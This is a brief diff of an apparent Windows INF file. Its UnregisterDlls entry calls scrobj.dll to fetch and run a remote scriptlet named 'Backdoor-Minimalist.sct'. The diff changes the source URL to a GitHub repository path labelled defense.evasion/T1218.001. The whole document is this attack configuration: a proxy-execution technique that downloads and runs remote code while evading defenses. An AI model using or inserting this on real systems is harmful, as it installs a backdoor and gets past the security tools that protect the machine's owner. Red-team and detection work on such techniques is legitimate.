@@ -28,4 +28,4 @@ UnregisterDlls = tune
 UnregisterDlls = tune
 
 [tune]
-11,,scrobj.dll,2,60,https://gist.githubusercontent.com/Backdoor-Minimalist.sct
+11,,scrobj.dll,2,60,https://raw.githubusercontent.com/0d4rk30/EDR.CTC/main/defense.evasion/T1218.001/Backdoor-Minimalist.sct
